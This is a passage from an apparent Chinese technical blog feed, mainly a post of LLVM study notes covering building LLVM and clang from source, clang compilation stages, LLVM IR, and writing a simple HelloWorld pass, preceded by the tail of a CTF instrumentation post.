class="hljs-built_in">print</span>(flag)<br><span class="hljs-keyword">break</span><br><span class="hljs-keyword">if</span>(ok==<span class="hljs-number">0</span>):<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;result : &#x27;</span>+flag)<br>exit()<br><span class="hljs-comment">#flag&#123;2c7c093b-f648-11ed-a716-701ab8caaafe</span><br></code></pre></td></tr></table></figure><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://www.intel.cn/content/www/cn/zh/developer/articles/tool/pin-a-dynamic-binary-instrumentation-tool.html">Intel官方文档 Pin</a></p><p><a href="https://blog.csdn.net/T2777/article/details/121282703#Pin%20%E6%80%BB%E7%BB%93%F0%9F%93%98">[csdn]Pin介绍，翻译了用户手册的一部分</a></p><p><a href="https://ctf-wiki.github.io/ctf-tools/binary-core-tools/instrumentation/intel_pin/">[ctf-wiki]intel pin</a></p><p><a href="https://www.v4ler1an.com/">V4ler1an的博客</a></p><p><a href="https://www.intel.cn/content/www/cn/zh/developer/articles/tool/software-development-emulator.html?_x_tr_sl=auto&_x_tr_tl=zh-CN&_x_tr_hl=zh-CN">Intel sde官方文档&amp;&amp;下载</a></p>]]></content>
    
    
    <categories>
      
      <category>软件测试&amp;漏洞挖掘</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Pintools</tag>
      
      <tag>插桩</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>LLVM学习记录</title>
    <link href="/2023/10/03/LLVM%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
    <url>/2023/10/03/LLVM%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/</url>
    
    <content type="html"><![CDATA[<h1 id="LLVM学习记录"><a href="#LLVM学习记录" class="headerlink" title="LLVM学习记录"></a>LLVM学习记录</h1><h2 id="LLVM介绍"><a href="#LLVM介绍" class="headerlink" title="LLVM介绍"></a>LLVM介绍</h2><p><a href="https://zh.wikipedia.org/wiki/LLVM">wiki-llvm</a></p><p>LLVM由c++写成，是一个自由软件项目，一种编译器基础设施，一种编译器架构，是一个模块化可重用的编译器及工具链技术的集合，用来开发编译器前端和后端。</p><p>LLVM官网首页中介绍了LLVM的主要官方子项目，包括LLVM Core libraries、clang、LLDB等。</p><p>传统静态编译器最流行的设计是三阶段设计，其主要组件是前端、优化器和后端。前端解析源代码，检查错误，并构建特定于语言的抽象语法树（AST）来表示输入代码。AST 可以选择转换为新的表示形式以进行优化，并且优化器和后端在代码上运行。传统的编译器诸如GCC前后端耦合在一起，很难支持一门新的语言。</p><p>LLVM框架与传统编译器的区别在于引入了**中间代码IR(SSA静态单赋值形式)**，这是LLVM中设计的最重要的一部分。前端对于不同语言的源代码转换成统一的IR的形式，IR选择性地经过一系列pass优化，后端将IR转换成不同的机器代码，这样的设计使得LLVM格外灵活，支持一种新的编程语言，只需要实现一个新的前端。支持一种新的硬件设备，只需要实现一个新的后端。而优化阶段针对的也是统一的LLVM IR。</p><p>**前端(Frontend)**：词法分析-&gt;语法分析(生成AST语法树)-&gt;语义分析-&gt;中间代码(IR)。</p><p><strong>优化器(Optimizer)</strong>: 中间代码优化，也可以加载LLVM Pass执行自定义的优化。</p><p><strong>后端(Backend)</strong>: 生成汇编，生成目标文件。把IR编译成目标平台的机器代码。</p><p>LLVM框架图</p><p><img src="/2023/10/03/LLVM%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/QQ%E6%88%AA%E5%9B%BE20230709194735.png" alt="llvm框架"></p><p>LLVM前端已支持的编程语言：C、C++、ActionScript、Ada、D语言、Fortran、GLSL、Haskell、Java字节码、Objective-C、Swift、Python、Ruby、Crystal、Rust、Scala以及C#等</p><p>LLVM后端已支持指令集架构：x86、x86-64、ARM、MIPS、PowerPC以及RISC-V等</p><h2 id="llvm构建"><a href="#llvm构建" class="headerlink" title="llvm构建"></a>llvm构建</h2><p><a href="https://llvm.org/docs/GettingStarted.html#below">官方文档</a></p><p>安装llvm的方式有获取官方预构建二进制文件、使用软件包管理器、从源代码构建三种，为了更好地了解llvm结构，这里选择从源代码构建，仅包含了LLVM核心库及clang子项目</p><p>环境及llvm版本</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ubuntu2004</span>虚拟机<br><span class="hljs-attribute">cmake</span> version <span class="hljs-number">3</span>.<span class="hljs-number">22</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">ninja</span> <span class="hljs-number">1</span>.<span class="hljs-number">10</span>.<span class="hljs-number">0</span><br><span class="hljs-attribute">lld</span><br><span class="hljs-attribute">llvm</span> <span class="hljs-number">17</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>git<br></code></pre></td></tr></table></figure><p>初始位置在Home目录，构建过程：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell">mkdir LLVM<br>cd LLVM<br>git clone --depth 1 https://github.com/llvm/llvm-project.git<br>cd llvm-project<br>mkdir build<br>cd build <br>touch build.sh<br>sudo ./build.sh<br></code></pre></td></tr></table></figure><p>build.sh的内容</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell">cmake -G Ninja \<br>-DLLVM_ENABLE_PROJECTS=&#x27;clang&#x27; \<br>-DCMAKE_BUILD_TYPE=Release \<br>-DLLVM_TARGETS_TO_BUILD=&quot;X86&quot; \<br>-DBUILD_SHARED_LIBS=On \<br>-DLLVM_USE_LINKER=lld \  <br>../llvm<br><br>ninja <br>ninja install<br></code></pre></td></tr></table></figure><p>测试</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">clang -v<br></code></pre></td></tr></table></figure><p> 参数解释：</p><ul><li>-G Ninja 生成ninja构建文件，使用ninja来构建</li><li>-DLLVM_ENABLE_PROJECTS&#x3D;’clang’ 除了 LLVM Core 外，还需要编译的子项目</li><li>-DCMAKE_BUILD_TYPE&#x3D;Release cmake的release编译模式，构建时不包含调试信息和断言，占用空间少，编译更快</li><li>-DLLVM_TARGETS_TO_BUILD&#x3D;“X86”：默认是ALL，选择X86可节约很多编译时间</li><li>-DBUILD_SHARED_LIBS&#x3D;On：指定动态链接 LLVM 的库，可以节省空间</li><li>-DLLVM_USE_LINKER&#x3D;lld，使用lld链接器，减少编译时间</li></ul><p><strong>踩到的坑</strong></p><p>1.cmake版本不能太低，如果通过apt下载的cmake版本无法达到要求，则自己到官网下载</p><p><a href="https://blog.csdn.net/m0_54348354/article/details/125697834">更新cmake参考</a></p><p>2.给虚拟机预留足够的磁盘空间，并且保存快照，内存设置至少4G。编译时间较长，内容较多，内存不足可能会导致虚拟机卡死，磁盘空间不足会导致编译终止，同时重启后无法正常进入图形化界面。</p><h2 id="llvm及clang基本使用"><a href="#llvm及clang基本使用" class="headerlink" title="llvm及clang基本使用"></a>llvm及clang基本使用</h2><p>Clang是类C语言的编译器前端，是LLVM的一个子项目,代码优化和后端由LLVM核心库提供，所以在下面的编译步骤拆解中，生成IR前都是使用clang命令，之后使用的都是llvm的其它工具</p><h3 id="llvm和clang的关系"><a href="#llvm和clang的关系" class="headerlink" title="llvm和clang的关系"></a>llvm和clang的关系</h3><p><img src="/2023/10/03/LLVM%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/QQ%E6%88%AA%E5%9B%BE20230724030043.png" alt="QQ截图20230724030043"></p><h3 id="clang编译步骤及命令"><a href="#clang编译步骤及命令" class="headerlink" title="clang编译步骤及命令"></a>clang编译步骤及命令</h3><p>对于c++代码，使用clang++</p><p>对于c代码，使用clang</p><h4 id="1-查看编译的步骤"><a href="#1-查看编译的步骤" class="headerlink" title="1.查看编译的步骤"></a>1.查看编译的步骤</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">clang -ccc-print-phases hello.c<br></code></pre></td></tr></table></figure><p><img src="/2023/10/03/LLVM%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/QQ%E6%88%AA%E5%9B%BE20230714183648.png" alt="QQ截图20230714183648"></p><p>这里冒号后的三个部分含义分别是工具、输入、输出</p><p>可以看到包括了input、preprocessor、compiler、backend、assembler、linker六个阶段,事实上在compiler阶段还包括了词法分析、语法分析、语义分析(输出抽象语法树AST)、IR代码生成及优化。</p><p>clang中每个步骤生成的文件</p><p><img src="/2023/10/03/LLVM%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/QQ%E6%88%AA%E5%9B%BE20230724145504.png" alt="QQ截图20230724145504"></p><h4 id="2-编译步骤拆解"><a href="#2-编译步骤拆解" class="headerlink" title="2.编译步骤拆解"></a>2.编译步骤拆解</h4><p><strong>测试用例</strong>  hello.c</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;Hello World!&quot;</span> &lt;&lt; endl;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>预处理</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">clang -E hello.c</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">1 <span class="hljs-string">&quot;hello.c&quot;</span></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">1 <span class="hljs-string">&quot;&lt;built-in&gt;&quot;</span> 1</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">1 <span class="hljs-string">&quot;&lt;built-in&gt;&quot;</span> 3</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">384 <span class="hljs-string">&quot;&lt;built-in&gt;&quot;</span> 3</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">1 <span class="hljs-string">&quot;&lt;command line&gt;&quot;</span> 1</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">1 <span class="hljs-string">&quot;&lt;built-in&gt;&quot;</span> 2</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">1 <span class="hljs-string">&quot;hello.c&quot;</span> 2</span><br>int main()&#123;<br> printf(&quot;Hello World!\n&quot;);<br> return 0;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>词法分析</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">clang -E -Xclang -dump-tokens hello.c</span><br>int &#x27;int&#x27; [StartOfLine]Loc=&lt;hello.c:1:1&gt;<br>identifier &#x27;main&#x27; [LeadingSpace]Loc=&lt;hello.c:1:5&gt;<br>l_paren &#x27;(&#x27;Loc=&lt;hello.c:1:9&gt;<br>r_paren &#x27;)&#x27;Loc=&lt;hello.c:1:10&gt;<br>l_brace &#x27;&#123;&#x27;Loc=&lt;hello.c:1:11&gt;<br>identifier &#x27;printf&#x27; [StartOfLine] [LeadingSpace]Loc=&lt;hello.c:2:2&gt;<br>l_paren &#x27;(&#x27;Loc=&lt;hello.c:2:8&gt;<br>string_literal &#x27;&quot;Hello World!\n&quot;&#x27;Loc=&lt;hello.c:2:9&gt;<br>r_paren &#x27;)&#x27;Loc=&lt;hello.c:2:25&gt;<br>semi &#x27;;&#x27;Loc=&lt;hello.c:2:26&gt;<br>return &#x27;return&#x27; [StartOfLine] [LeadingSpace]Loc=&lt;hello.c:3:2&gt;<br>numeric_constant &#x27;0&#x27; [LeadingSpace]Loc=&lt;hello.c:3:9&gt;<br>semi &#x27;;&#x27;Loc=&lt;hello.c:3:10&gt;<br>r_brace &#x27;&#125;&#x27; [StartOfLine]Loc=&lt;hello.c:4:1&gt;<br>eof &#x27;&#x27;Loc=&lt;hello.c:4:2&gt;<br></code></pre></td></tr></table></figure><p><strong>语法分析与语义分析生成语法树AST</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">clang -fsyntax-only -Xclang -ast-dump hello.c<br><span class="hljs-meta prompt_">#</span><span class="language-bash">代码量过大</span><br></code></pre></td></tr></table></figure><p><strong>生成LLVM IR</strong></p><p>LLVM IR在磁盘中有两种形式：文本格式,拓展名.ll;bitcode二进制格式，拓展名.bc</p><p>文本格式</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">clang -S -emit-llvm hello.c<br></code></pre></td></tr></table></figure><p>二进制格式</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">clang -c -emit-llvm hello.c<br></code></pre></td></tr></table></figure><p>llvm提供了两种格式相互转换的工具：<strong>汇编器llvm-as</strong>和反汇编器llvm-dis</p><p>llvm-as:将.ll转换成.bc</p><p>llvm-dis:将.bc转换成.ll</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">llvm-as hello.ll -o hello.bc<br>llvm-dis hello.bc -o hello.ll<br></code></pre></td></tr></table></figure><p><strong>使用lli工具执行LLVM bitcode格式程序(可选)</strong></p><p>注：LLI <em>不是</em>模拟器。它不会执行不同架构的 IR 并且它只能解释（或 JIT 编译）主机体系结构。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">lli hello.bc</span><br>Hello World!<br></code></pre></td></tr></table></figure><p><strong>使用llc工具生成汇编代码及目标文件</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">llc hello.bc -o hello.s<br></code></pre></td></tr></table></figure><p>生成的汇编代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs assembly">.text<br>.file&quot;hello.c&quot;<br>.globlmain                            # -- Begin function main<br>.p2align4, 0x90<br>.typemain,@function<br>main:                                   # @main<br>.cfi_startproc<br># %bb.0:<br>pushq%rbp<br>.cfi_def_cfa_offset 16<br>.cfi_offset %rbp, -16<br>movq%rsp, %rbp<br>.cfi_def_cfa_register %rbp<br>subq$16, %rsp<br>movl$0, -4(%rbp)<br>movabsq$.L.str, %rdi<br>movb$0, %al<br>callqprintf@PLT<br>xorl%eax, %eax<br>addq$16, %rsp<br>popq%rbp<br>.cfi_def_cfa %rsp, 8<br>retq<br>.Lfunc_end0:<br>.sizemain, .Lfunc_end0-main<br>.cfi_endproc<br>                                        # -- End function<br>.type.L.str,@object                  # @.str<br>.section.rodata.str1.1,&quot;aMS&quot;,@progbits,1<br>.L.str:<br>.asciz&quot;Hello World!\n&quot;<br>.size.L.str, 14<br><br>.ident&quot;clang version 17.0.0 (https://github.com/llvm/llvm-project.git b16372c5fc65a6a7c14c19f01b17ac15a964d21f)&quot;<br>.section&quot;.note.GNU-stack&quot;,&quot;&quot;,@progbits<br></code></pre></td></tr></table></figure><p>生成目标文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">llc -filetype=obj hello.bc -o hello.o<br></code></pre></td></tr></table></figure><p>接下来进行链接即可生成可执行文件，链接器用ld和llvm的子项目lld都可以</p><h3 id="部分指令解释"><a href="#部分指令解释" class="headerlink" title="部分指令解释"></a>部分指令解释</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs shell">-ccc-print-phases<br>查看编译的步骤<br><br>-E, --preprocess<br>Only run the preprocessor<br>只允许预处理步骤<br>-S, --assemble<br>Only run preprocess and compilation steps<br>只运行预处理和编译步骤<br><br>-c, --compile<br>Only run preprocess, compile, and assemble steps<br>只运行预处理,编译和汇编步骤<br><br>-emit-llvm<br>使用汇编程序和目标文件的 LLVM 表示，可查看IR<br><br>-fsyntax-only<br>运行预处理器、解析器和语义分析阶段<br><br>-Xclang &lt;arg&gt;<br>传递 &lt;arg&gt; 到 clang -cc1<br><br>-dump-tokens<br>运行预处理器,拆分内部代码段为各种token、<br><br>-ast-dump<br>构建抽象语法树AST,然后对其进行拆解和调试<br></code></pre></td></tr></table></figure><p>更多细节查看</p><p><a href="https://clang.llvm.org/docs/ClangCommandLineReference.html">Clang 命令行参数参考</a></p><p><a href="https://llvm.org/docs/CommandGuide/index.html">llvm命令指南</a></p><h2 id="LLVM-IR"><a href="#LLVM-IR" class="headerlink" title="LLVM IR"></a>LLVM IR</h2><p><a href="https://llvm.org/docs/LangRef.html#abstract">llvm ir参考手册</a></p><p>LLVM的核心是<strong>IR语言</strong>（Intermediate Representation），一种类似汇编的底层语言。</p><p>IR是一种强类型的精简指令集（Reduced Instruction Set Computing，RISC），并对目标指令集进行了抽象。</p><p>LLVM IR有3种表示形式：</p><p>text：便于阅读的文本格式。扩展名为.ll<br>bitcode：二进制格式。扩展名为.bc<br>memory：内存格式</p><p>LLVM IR 的特点如下：</p><ul><li>采用静态单一赋值（Static Single Assignment，SSA），即每个值只有一个定义它的赋值操作</li><li>代码被组织为三地址指令（Three-address Instructions）</li><li>有无限多个寄存器</li></ul><h2 id="LLVM-Pass"><a href="#LLVM-Pass" class="headerlink" title="LLVM Pass"></a>LLVM Pass</h2><p>如下图，opt是LLVM的优化器和分析器，可以加载编译好的LLVM Pass，对LLVM IR进行优化。为了对IR进行自定义的优化，我们要做的就是编写好Pass的源代码，编写构建脚本对源码进行编译(一般是.so)，然后用opt工具来加载pass对IR进行优化。</p><p><img src="/2023/10/03/LLVM%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/QQ%E6%88%AA%E5%9B%BE20230713210133.png" alt="QQ截图20230713210133"></p><p>首先，为了快速入门，先编写一个最基础的Pass，其功能是打印出程序中非外部函数的函数名。</p><p>需要注意的是，在<a href="https://releases.llvm.org/14.0.0/docs/ReleaseNotes.html">LLVM 14.0.0 发行说明</a>中，提到了已经不再推荐使用旧版的pass管理器(the legacy pass manager)，并且旧版在llvm14.0.0之后的版本将被移除，但是网上的大部分pass编写教程都还是基于旧版。本文使用的是LLVM17.0.0 git，编译<a href="https://github.com/sampsyo/llvm-pass-skeleton/tree/master">旧版框架pass</a>时发现缺少include&#x2F;llvm&#x2F;Transforms&#x2F;IPO&#x2F;PassManagerBuilder.h这个头文件，源代码中也没有lib&#x2F;Transform&#x2F;IPO&#x2F;PassManagerBuilder.cpp源文件，而PassManagerBuilder类用于构建旧版PassManager以及默认的Pass管道，这说明确实已经不支持旧版PM了。所以这里使用新版pass管理器。</p><p><img src="/2023/10/03/LLVM%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/QQ%E6%88%AA%E5%9B%BE20230728151311.png" alt="QQ截图20230728151311"></p><p><a href="https://llvm.org/docs/WritingAnLLVMPass.html">旧版PM官方教程</a></p><p><a href="https://llvm.org/docs/WritingAnLLVMNewPMPass.html">新版PM官方教程</a></p><p>PM是PassManager的简称</p><h3 id="源码集成编译"><a href="#源码集成编译" class="headerlink" title="源码集成编译"></a>源码集成编译</h3><h4 id="不生成和使用-so的pass编写方式"><a href="#不生成和使用-so的pass编写方式" class="headerlink" title="不生成和使用.so的pass编写方式"></a>不生成和使用.so的pass编写方式</h4><p>该方式不会产生pass的.so文件，使用opt时直接添加–passes来使用pass，opt –passes具体的用法在<a href="https://llvm.org/docs/NewPassManager.html#id2">该文档</a></p><p><a href="https://llvm.org/docs/WritingAnLLVMNewPMPass.html">新版Writing an LLVM Pass官方教程</a>中是源码内编译的，跟着教程做就可以了</p><p>在llvm&#x2F;lib&#x2F;Transforms&#x2F;Utils&#x2F;HelloWorld.cpp<code>llvm/lib/Transforms/Utils/CMakeLists.txt</code>中添加HelloWorld.cpp,即Pass的源文件</p><p><img src="/2023/10/03/LLVM%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/QQ%E6%88%AA%E5%9B%BE20230731172147.png" alt="QQ截图20230731172147"></p><p>添加llvm&#x2F;include&#x2F;llvm&#x2F;Transforms&#x2F;Utils&#x2F;HelloWorld.h</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> LLVM_TRANSFORMS_HELLONEW_HELLOWORLD_H</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> LLVM_TRANSFORMS_HELLONEW_HELLOWORLD_H</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;llvm/IR/PassManager.h&quot;</span></span><br><br>namespace llvm &#123;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">HelloWorldPass</span> :</span> public PassInfoMixin&lt;HelloWorldPass&gt; &#123;<br>public:<br>  PreservedAnalyses <span class="hljs-title function_">run</span><span class="hljs-params">(Function &amp;F, FunctionAnalysisManager &amp;AM)</span>;<br>&#125;;<br><br>&#125; <span class="hljs-comment">// namespace llvm</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span> <span class="hljs-comment">// LLVM_TRANSFORMS_HELLONEW_HELLOWORLD_H</span></span><br></code></pre></td></tr></table></figure><p>添加llvm&#x2F;lib&#x2F;Transforms&#x2F;Utils&#x2F;HelloWorld.cpp</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//===-- HelloWorld.cpp - Example Transformations --------------------------===//</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// Part of the LLVM Project, under the Apache License v2.0 with LLVM Exceptions.</span><br><span class="hljs-comment">// See https://llvm.org/LICENSE.txt for license information.</span><br><span class="hljs-comment">// SPDX-License-Identifier: Apache-2.0 WITH LLVM-exception</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">//===----------------------------------------------------------------------===//</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;llvm/Transforms/Utils/HelloWorld.h&quot;</span></span><br><br>using namespace llvm;<br><br>PreservedAnalyses <span class="hljs-title function_">HelloWorldPass::run</span><span class="hljs-params">(Function &amp;F,</span><br><span class="hljs-params">                                      FunctionAnalysisManager &amp;AM)</span> &#123;<br>  errs() &lt;&lt; F.getName() &lt;&lt; <span class="hljs-string">&quot;\n&quot;</span>;<br>  <span class="hljs-keyword">return</span> PreservedAnalyses::all();<br>&#125;<br></code></pre></td></tr></table></figure><p>在llvm&#x2F;lib&#x2F;Passes&#x2F;PassRegistry.def中添加，该步骤是注册pass，第一个参数即在opt工具中的pass名称</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">FUNCTION_PASS</span><span class="hljs-params">(<span class="hljs-string">&quot;helloworld&quot;</span>, HelloWorldPass()</span></span>)<br></code></pre></td></tr></table></figure><p><img src="/2023/10/03/LLVM%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/QQ%E6%88%AA%E5%9B%BE20230731172806.png" alt="QQ截图20230731172806"></p><p>运行上文llvm构建一节中的build.sh,重新构建llvm。之前已经构建好的不会重新编译，所以编译得很快</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell">cmake -G Ninja \<br>-DLLVM_ENABLE_PROJECTS=&#x27;clang&#x27; \<br>-DCMAKE_BUILD_TYPE=Release \<br>-DLLVM_TARGETS_TO_BUILD=&quot;X86&quot; \<br>-DBUILD_SHARED_LIBS=On \<br>-DLLVM_USE_LINKER=lld \  <br>../llvm<br><br>ninja <br>ninja install<br></code></pre></td></tr></table></figure><p>随后使用opt时加入参数-passes&#x3D;helloworld就能使用该名为helloworld的pass了</p><p>测试用例</p><p>helloworld.ll</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-keyword">define</span> <span class="hljs-type">i32</span> <span class="hljs-title">@foo</span>() &#123;<br>  <span class="hljs-variable">%a</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">add</span> <span class="hljs-type">i32</span> <span class="hljs-number">2</span><span class="hljs-punctuation">,</span> <span class="hljs-number">3</span><br>  <span class="hljs-keyword">ret</span> <span class="hljs-type">i32</span> <span class="hljs-variable">%a</span><br>&#125;<br><br><span class="hljs-keyword">define</span> void <span class="hljs-title">@bar</span>() &#123;<br>  <span class="hljs-keyword">ret</span> void<br>&#125;<br></code></pre></td></tr></table></figure><p>测试结果，测试时位于构建时创建的build目录中</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">opt -disable-output <span class="hljs-string">&#x27;/home/op1n/LLVM/llvm_pass/ir_for_test/helloworld.ll&#x27;</span>   -passes=helloworld</span> <br>foo<br>bar<br><span class="hljs-meta prompt_">#</span><span class="language-bash">--print-passes可打印出所有注册的pass</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">opt --print-passes | grep hello</span> <br>  helloworld<br></code></pre></td></tr></table></figure><h4 id="生成和使用-so的pass编写方式"><a href="#生成和使用-so的pass编写方式" class="headerlink" title="生成和使用.so的pass编写方式"></a>生成和使用.so的pass编写方式</h4><p>主要参考<a href="https://bbs.kanxue.com/thread-257665.htm">该文章</a>及旧版的<a 